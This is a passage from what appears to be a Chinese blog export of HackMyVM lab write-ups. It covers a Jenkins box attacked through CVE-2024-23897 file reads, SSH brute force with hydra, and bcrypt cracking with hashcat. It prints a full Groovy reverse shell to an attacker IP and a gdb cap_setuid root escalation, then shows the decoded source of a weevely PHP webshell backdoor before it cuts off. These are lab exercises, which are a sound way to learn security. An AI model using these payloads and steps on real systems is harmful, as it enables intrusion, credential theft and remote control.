\u9875\u9762\u3002\u8bbf\u95ee\u6709\u70b9\u6162\uff0c\u53d1\u73b0\u5b83\u5728\u52a0\u8f7d`192.168.5.32:8080`\u7684\u4e1c\u897f\uff0c\u6211\u4eec\u5148\u7ed9\u4ed6\u7981\u4e86\n\n![image](https://github.com/user-attachments/assets/cf4ca609-e74a-46f2-9298-addc5931cf52)\n\n\u4e0a\u53bb\u5728people\u770b\u5230\u6709\u4e24\u4e2a\u7528\u6237\uff0c`anonymous`\u548c`an0ma1`\n\n![image](https://github.com/user-attachments/assets/e794228c-5f00-417e-a444-4a99ff39139a)\n\n<div>\n<br />\n</div>\n\n\u626b\u63cf\u4e00\u4e0b\u7ad9\u70b9\u7684\u67b6\u6784\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ searchsploit Jenkins 2.441  \n----------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                       |  Path\n----------------------------------------------------------------------------------------------------- ---------------------------------\nJenkins 2.441 - Local File Inclusion                                                                 | java/webapps/51993.py\n----------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n\n```\n\n\u6709\u4e00\u4e2a\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u4f60\u4eec\u53ef\u4ee5\u7528\u8fd9\u4e2aPOC\u4f46\u662f\u6211\u611f\u89c9[\u8fd9\u4e2a](https://github.com/godylockz/CVE-2024-23897)\u66f4\u597d\u7528\uff0c\u6211\u5c31\u7528\u8fd9\u4e2a\u4e86\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ git clone https://github.com/godylockz/CVE-2024-23897.git                     \n\u6b63\u514b\u9686\u5230 'CVE-2024-23897'...\nremote: Enumerating objects: 4, done.\nremote: Counting objects: 100% (4/4), done.\nremote: Compressing objects: 100% (4/4), done.\nremote: Total 4 (delta 0), reused 4 (delta 0), pack-reused 0 (from 0)\n\u63a5\u6536\u5bf9\u8c61\u4e2d: 100% (4/4), \u5b8c\u6210.\n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cd CVE-2024-23897 \n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/CVE-2024-23897]\n\u2514\u2500$ ls    \njenkins_fileread.py  README.md\n                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/CVE-2024-23897]\n\u2514\u2500$ python3 jenkins_fileread.py -u http://192.168.205.217:8080\nWelcome to the Jenkins file-read shell. Type help or ? to list commands.\n\nfile> /etc/passwd\nmessagebus:x:103:104::/nonexistent:/usr/sbin/nologin\ndnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\npollinate:x:105:1::/var/cache/pollinate:/bin/false\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\npenetration:x:1001:1001::/home/penetration:/bin/bash\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false\nusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ntss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false\ntcpdump:x:109:115::/nonexistent:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nlandscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin\nkali:x:1000:1000:asd:/home/kali:/bin/bash\nroot:x:0:0:root:/root:/bin/bash\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nsyslog:x:107:113::/home/syslog:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nuuidd:x:108:114::/run/uuidd:/usr/sbin/nologin\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\n                      \n```\n\n\u7528\u6237\u662f`kali`\u3001`penetration`\u3001`root`\n\n\u7136\u540e\u6709\u4e24\u4e2a**\u73a9\u6cd5**\n\n### \u65b9\u6cd5\u4e00\uff1a\n\n\u76f4\u63a5\u62ff\u7528\u6237\u7206\u7834ssh\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ cat user                                                                                        \nkali\npenetration\nroot\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.217 -f -t 64 \nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-31 12:44:58\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 64 tasks per 1 server, overall 64 tasks, 15000 login tries (l:3/p:5000), ~235 tries per task\n[DATA] attacking ssh://192.168.205.217:22/\n[22][ssh] host: 192.168.205.217   login: kali   password: asdfgh\n[STATUS] attack finished for 192.168.205.217 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-31 12:45:43\n\n```\n\n\u62ff\u5230`kali`\u7684\u5bc6\u7801\u76f4\u63a5\u767b\u5f55\uff0c\u4f60\u5c31\u4f1a\u53d1\u73b0`sudo`\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u4efb\u610f\u8f6f\u4ef6`bash -p`\u5c31\u662froot\u4e86\uff0c\u8fd9\u79cd\u5e94\u8be5\u4e0d\u662f\u6b63\u786e\u7684\u6253\u5f00\u65b9\u5f0f\u3002\n\n### \u65b9\u6cd5\u4e8c\uff1a\n\n\u62ff\u4efb\u610f\u8bfb\u53d6\u8bfb\u7528\u6237\u5e10\u6237\u5bc6\u7801\u7136\u540e\u4f7f\u7528`jenkins`\u5f39\u53cd\u5f39shell\uff0c\u4f46\u662f`jenkins`\u7684\u8def\u5f84\u6211\u6ca1\u6709\u627e\u5230\uff0c\u6211\u7eaf\u5c5e\u9a6c\u540e\u70ae\uff0c\u54c8\u54c8\u54c8\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/CVE-2024-23897]\n\u2514\u2500$ python3 jenkins_fileread.py -u http://192.168.205.217:8080\\\nWelcome to the Jenkins file-read shell. Type help or ? to list commands.\n\nfile> /home/penetration/users/users.xml\nFile does not exist\nfile> /home/penetration/.jenkins/users/users.xml\n<?xml version='1.1' encoding='UTF-8'?>\n  <idToDirectoryNameMap class=\n    <entry>\n      <string>an0ma1_6703692303677686036</string>\n  <version>1</version>\n      <string>an0ma1</string>\n</hudson.model.UserIdMapper>\n  </idToDirectoryNameMap>\n<hudson.model.UserIdMapper>\n    </entry>\nfile> /home/penetration/.jenkins/users/an0ma1_6703692303677686036/config.xml\n<hudson.search.UserSearchProperty>\n      <roles>\n    <jenkins.security.seed.UserSeedProperty>\n    </hudson.search.UserSearchProperty>\n      </tokenStore>\n  <properties>\n      <flags/>\n    <jenkins.security.LastGrantedAuthoritiesProperty>\n    <hudson.model.MyViewsProperty>\n</user>\n  <id>an0ma1</id>\n    </jenkins.security.ApiTokenProperty>\n      <views>\n    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=\n        <string>authenticated</string>\n<user>\n          <name>all</name>\n      <collapsed/>\n    </jenkins.security.seed.UserSeedProperty>\n    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=\n    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>\n    </hudson.model.MyViewsProperty>\n      <domainCredentialsMap class=\n      <triggers/>\n          <filterQueue>false</filterQueue>\n      <passwordHash>#jbcrypt:$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76</passwordHash>\n      </views>\n    <jenkins.security.ApiTokenProperty>\n    </hudson.model.PaneStatusProperties>\n    </hudson.tasks.Mailer_-UserProperty>\n      <emailAddress>1594743209@qq.com</emailAddress>\n    <jenkins.console.ConsoleUrlProviderUserProperty/>\n        <tokenList/>\n        </hudson.model.AllView>\n    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>\n          <owner class=\n  </properties>\n      <timestamp>1712972655377</timestamp>\n    <hudson.model.TimeZoneProperty/>\n    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>\n    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>\n      <insensitiveSearch>true</insensitiveSearch>\n    <hudson.security.HudsonPrivateSecurityRealm_-Details>\n          <properties class=\n        <hudson.model.AllView>\n    </hudson.security.HudsonPrivateSecurityRealm_-Details>\n      <seed>e9885566be638620</seed>\n      <providerId>default</providerId>\n    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>\n      </roles>\n    </jenkins.security.LastGrantedAuthoritiesProperty>\n    <hudson.model.PaneStatusProperties>\n    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=\n<?xml version='1.1' encoding='UTF-8'?>\n  <version>10</version>\n    <hudson.tasks.Mailer_-UserProperty plugin=\n          <filterExecutors>false</filterExecutors>\n      <tokenStore>\n    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin=\n  <fullName>Mike</fullName>\n\n```\n\n`#jbcrypt:10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76`\u7528\u6237\u7684hash\uff0c\u7834\u89e3\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/CVE-2024-23897]\n\u2514\u2500$ echo '$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76' > hash                                  \n                                                                                                                                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/CVE-2024-23897]\n\u2514\u2500$ hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt\nhashcat (v6.2.6) starting\n\nOpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]\n============================================================================================================================================\n* Device #1: cpu-skylake-avx512-AMD Ryzen 9 7940H w/ Radeon 780M Graphics, 6925/13914 MB (2048 MB allocatable), 12MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 72\n\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nRules: 1\n\nOptimizers applied:\n* Zero-Byte\n* Single-Hash\n* Single-Salt\n\nWatchdog: Temperature abort trigger set to 90c\n\nHost memory required for this attack: 0 MB\n\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\nCracking performance lower than expected?               \n\n* Append -w 3 to the commandline.\n  This can cause your screen to lag.\n\n* Append -S to the commandline.\n  This has a drastic speed impact but can be better for specific attacks.\n  Typical scenarios are a small wordlist but a large ruleset.\n\n* Update your backend API runtime / driver the right way:\n  https://hashcat.net/faq/wrongdriver\n\n* Create more work items to make use of your parallelization power:\n  https://hashcat.net/faq/morework\n\n$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76:369258\n                                                        \nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))\nHash.Target......: $2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZ...smGm76\nTime.Started.....: Tue Dec 31 12:59:17 2024 (30 secs)\nTime.Estimated...: Tue Dec 31 12:59:47 2024 (0 secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:      172 H/s (7.45ms) @ Accel:12 Loops:8 Thr:1 Vec:1\nRecovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)\nProgress.........: 5040/14344385 (0.04%)\nRejected.........: 0/5040 (0.00%)\nRestore.Point....: 4896/14344385 (0.03%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024\nCandidate.Engine.: Device Generator\nCandidates.#1....: FUCKYOU -> twisted\nHardware.Mon.#1..: Util: 75%\n\nStarted: Tue Dec 31 12:59:13 2024\nStopped: Tue Dec 31 12:59:49 2024\n                                                         \n```\n\n\u7136\u540e\u767b\u4e0a\u53bb\u5f39\u4e2ashell\u56de\u6765\n\nManage Jenkins --> Script Console\n\nGroovy\u7684\u53cd\u5f39shell\uff0c\u6211\u7684\u662f\u8fd9\u6837\u7684\n\n```bash\nString host='192.168.205.141';int port=8888;String cmd='bash';Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n```\n\n\u56de\u6765\u4e86\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/CVE-2024-23897]\n\u2514\u2500$ nc -lvnp 8888        \nlistening on [any] 8888 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.217] 51832\nid\nuid=1001(penetration) gid=1001(penetration) groups=1001(penetration)\n\n```\n\n## 3.**\u83b7\u5f97\u7a33\u5b9a shell**\n\n\u83b7\u5f97\u4ea4\u4e92\u5f0f TTY shell\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n## 4.\u63d0\u53d6\n\n```bash\npenetration@asd:/opt$ id\nuid=1001(penetration) gid=1001(penetration) groups=1001(penetration)\npenetration@asd:/opt$ sudo -l\nMatching Defaults entries for penetration on asd:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser penetration may run the following commands on asd:\n    (ALL) NOPASSWD: /opt/babyGift/vuln\n\npenetration@asd:/opt$ /sbin/getcap -r / 2>/dev/null\n/snap/core20/2264/usr/bin/ping cap_net_raw=ep\n/snap/core20/2434/usr/bin/ping cap_net_raw=ep\n/usr/bin/ping cap_net_raw=ep\n/usr/bin/mtr-packet cap_net_raw=ep\n/usr/bin/gdb cap_setuid=ep\n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep\n\n```\n\n\u6709\u4e2a`/usr/bin/gdb cap_setuid=ep`\u53ef\u4ee5`Capabilities`\u53ef\u4ee5\u5229\u7528\n\n![image](https://github.com/user-attachments/assets/c8a29b20-614e-42b1-a4a0-9ddce4ec068d)\n\n```bash\npenetration@asd:/opt$ /usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit\nGNU gdb (Ubuntu 13.1-2ubuntu2.1) 13.1\nCopyright (C) 2023 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\nType 'show copying' and 'show warranty' for details.\nThis GDB was configured as 'x86_64-linux-gnu'.\nType 'show configuration' for configuration details.\nFor bug reporting instructions, please see:\n<https://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n    <http://www.gnu.org/software/gdb/documentation/>.\n\nFor help, type 'help'.\nType 'apropos word' to search for commands related to 'word'.\n# id\nuid=0(root) gid=1001(penetration) groups=1001(penetration)\n```sentence", "top": 0, "createdAt": 1751016816, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P114": {"htmlDir": "docs/post/hmv_Wave.html", "labels": ["HackMyVM"], "postTitle": "hmv_Wave", "postUrl": "post/hmv_Wave.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/114", "commentNum": 0, "wordCount": 18480, "description": "# hmv_Wave\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - Wave](https://hackmyvm.eu/machines/machine.php?vm=Wave)\n**\u96be\u5ea6**\uff1a\u9ec4\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.138\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 18:30 CST\nNmap scan report for 192.168.205.138\nHost is up (0.00029s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n5555/tcp open  freeciv\nMAC Address: 08:00:27:37:83:76 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.58 seconds\n```\n\n\u53bb80\u770b\u770bweb\u9875\u9762\n\n# 2.\u8e29\u70b9\n\n![Image](https://github.com/user-attachments/assets/fc213d31-5792-4ec3-bc4f-f8ddc75839bb)\n\n\u7206\u7834\u76ee\u5f55\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ feroxbuster -u 'http://192.168.205.138/' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md \n                                                                                                                                  \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben 'epi' Risher \ud83e\udd13                 ver: 2.11.0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfaf  Target Url            \u2502 http://192.168.205.138/\n \ud83d\ude80  Threads               \u2502 50\n \ud83d\udcd6  Wordlist              \u2502 /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt\n \ud83d\udc4c  Status Codes          \u2502 All Status Codes!\n \ud83d\udca5  Timeout (secs)        \u2502 7\n \ud83e\udda1  User-Agent            \u2502 feroxbuster/2.11.0\n \ud83d\udc89  Config File           \u2502 /etc/feroxbuster/ferox-config.toml\n \ud83d\udd0e  Extract Links         \u2502 true\n \ud83d\udcb2  Extensions            \u2502 [php, html, txt, md]\n \ud83c\udfc1  HTTP methods          \u2502 [GET]\n \ud83d\udd03  Recursion Depth       \u2502 4\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \ud83c\udfc1  Press [ENTER] to use the Scan Management Menu\u2122\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                 \n200      GET        3l        5w       32c http://192.168.205.138/backup/phptest.bck\n200      GET        3l        6w       31c http://192.168.205.138/backup/index.bck\n200      GET        2l        1w        4c http://192.168.205.138/backup/log.log\n200      GET        1l        2w       18c http://192.168.205.138/backup/robots.bck\n200      GET        2l       13w      833c http://192.168.205.138/backup/weevely.bck\n200      GET        3l        6w       31c http://192.168.205.138/\n301      GET        7l       11w      169c http://192.168.205.138/backup => http://192.168.205.138/backup/\n200      GET        3l        6w       31c http://192.168.205.138/index.html\n200      GET        1l        2w       18c http://192.168.205.138/robots.txt\n200      GET        1l        2w       11c http://192.168.205.138/phptest.php\n[####################] - 48s   311445/311445  0s      found:10      errors:0    \n[####################] - 47s   311410/311410  6566/s  http://192.168.205.138/ \n[####################] - 0s    311410/311410  77852500/s http://192.168.205.138/backup/ => Directory listing (add --scan-dir-listings to scan)                           \n```\n\n\u63a2\u7d22\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138/backup/phptest.bck\n<?php\nprint ('HELLO WORLD');\n?>\n                                                                                                                                \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138/backup/index.bck  \n<h1> WAVE </h1>\n\n<!-- wAvE -->\n                                                                                                                                \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138/backup/log.log  \nOK\n\n                                                                                                                                \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138/backup/robots.bck\nDisallow: /backup\n                                                                                                                                \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138/backup/weevely.bck\nWarning: Binary output can mess up your terminal. Use '--output -' to tell curl to output it to your terminal anyway, or consider \nWarning: '--output <FILE>' to save to a file.\n```\n\n\u627e\u5230\u4e86\u4e00\u4e2a\u6587\u4ef6\uff0c\u6211\u4eec\u4e0b\u8f7d\u4e0b\u6765\u770b\u770b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.138/backup/weevely.bck -o /tmp/weevely.bck\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   515  100   515    0     0   217k      0 --:--:-- --:--:-- --:--:--  251k\n                                                                                                                                \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cd tmp                                                      \n                                                                                                                                                                                                                                              \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ cat weevely.bck                \n<?php include '\\160\\x68\\141\\x72\\72\\57\\57'.basename(__FILE__).'\\57\\x78';__HALT_COMPILER(); ?>/x\ufffdX\ufffd\ufffd\ufffdU\ufffd\ufffdj\ufffd0\u017f\ufffd)J\ufffdhB\ufffdS;\ufffd\ufffd\ufffd\n                                                                                                                      \ufffd/\ufffdJ\ufffd\ufffd\u2592m\ufffd.\ufffd\ufffd)\ufffd\ufffdn\ufffd(\u2592\ufffd\ufffd'`\ufffd=6\ufffd&T\ufffdYE\ufffdp\ufffd\ufffd(\ufffdq1\ufffd\ufffd\ufffda'H\ufffdPq6\ufffd.\ufffd\ufffd\ufffdv\ufffd\ufffd\ufffd/\ufffd\ufffd8\ufffd\u0133e\ufffd\ufffd$+\ufffd\ufffds\ufffd'\ufffd\ufffd\ufffd\ufffd5\ufffd|\ufffd\ufffdH\ufffd\ufffd O\ufffd\ufffd\ufffd\ufffdw\ufffd2%\ufffd\ufffdOyTV\ufffd\ufffd\ufffdQ\ufffdb\ufffdA\ufffd\ufffd\ufffdh\ufffd\ufffd=\ufffdW {\ufffd\ufffd\n\ufffdk\u041bw8\ufffda\ufffd\ufffd\ufffd\ufffdS\ufffd\ufffd\ufffd\ufffd\ufffd\n\ufffdfBLXx  \ufffd\ufffd\ufffd\u03dc\ufffd\ufffd\ufffd\ufffdv\ufffd\ufffd\ufffd\ufffdm\ufffd\ufffd\ufffd%#,H\ufffd\ufffdR#2HJ]\ufffdt\ufffd|*\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdh\ufffdMs\ufffd\ufffd\n                       \u0696&'\ufffd\ufffdY\ufffd\ufffd\ufffdP\ufffd\ufffdB\ufffd\ufffdlXw\ufffdl\ufffde\ufffd\ufffd\ufffdE!S\ufffdHe\ufffd2\ufffdp\ufffd7G\ufffd[N\ufffd\ufffd=\ufffd-\ufffd\ufffd\u0243\ufffdi\ufffd)\ufffd[\ufffd\ufffdN\ufffd\ufffd\ufffd\ufffd7\ufffd\ufffdU_\ufffd=*\ufffd\ufffd\u03a8\ufffds?c((VGBMB                                                                                                                                \n\n```\n\n\u90e8\u5206\u5185\u5bb9\u663e\u793a\u4e71\u7801\uff0c\u4f46\u662f\u6211\u4eec\u901a\u8fc7\u53ef\u8bfb\u7684\u53ef\u4ee5\u5f97\u77e5\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u6076\u610f\u540e\u95e8\uff0c\u6211\u4eec\u5c1d\u8bd5\u6062\u590d\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ file weevely.bck\nweevely.bck: PHP phar archive with SHA1 signature\n                                                                                                                                \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ phar extract -f weevely.bck weevely.phpr\n//home/kali/test/tmp/weevely.bck/x ...ok\n                                                                                                                                                                                                                                           \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/tmp]\n\u2514\u2500$ cat /home/kali/test/tmp/weevely.phpr/home/kali/test/tmp/weevely.bck/x \n<?php eval('$k='3ddf0d5c';$kh='b6e7a529b6c2';$kf='d598a771749b';$p='afnqDsRcBpVmU71y';\n\nfunction x($t,$k){\n$c=strlen($k);$l=strlen($t);$o='';\nfor($i=0;$i<$l;){\nfor($j=0;($j<$c&&$i<$l);$j++,$i++)\n{\n$o.=$t[$i]^$k[$j];\n}\n}\nreturn $o;\n}\nif (@preg_match('/$kh(.+)$kf/',@file_get_contents('php://input'),$m)==1) {\n@ob_start();\n@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));\n$o=@ob_get_contents();\n@ob_end_clean();\n$r=@base64_encode(@x(@gzcompress($o),$k));\nprint('$p$kh$r$kf');\n}');                                                                                                                                \n```\n\n\u786e\u5b9e\u662f**Webshell \u540e\u95e8**\uff0c\u6211\u4eec\u5c1d\u8bd5\u5229\u7528\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/kali/test/tmp/weevely.bck]\n\u2514\u2500$ cat tool.php \n<?php\n$k = '3ddf0d5c';  // \u5bc6\u94a5\n\nfunction x($t, $k)\n{\n    $c = strlen($k);  // \u5bc6\u94a5\u957f\u5ea6\n    $l = strlen($t);  // \u6587\u672c\u957f\u5ea6\n    $o = '';\n\n    // XOR \u52a0\u5bc6/\u89e3\u5bc6\n    for ($i = 0; $i < $l;)\n    {\n        for ($j = 0; ($j < $c && $i < $l); $j++, $i++)\n        {\n            $o .= chr(ord($t[$i]) ^ ord($k[$j]));\n        }\n    }\n    return $o;\n}\n\necho '\u9009\u62e9\u64cd\u4f5c\uff1a\\n';\necho '1. \u52a0\u5bc6\\n';\necho '2. \u89e3\u5bc6\\n';\n$choice = trim(fgets(STDIN));  // \u83b7\u53d6\u7528\u6237\u8f93\u5165\n\necho '\u8bf7\u8f93\u5165\u6587\u672c\uff1a\\n';\n$input_text = trim(fgets(STDIN));  // \u83b7\u53d6\u8981\u52a0\u5bc6/\u89e3\u5bc6\u7684\u6587\u672c\n\nif ($choice == 1) {\n    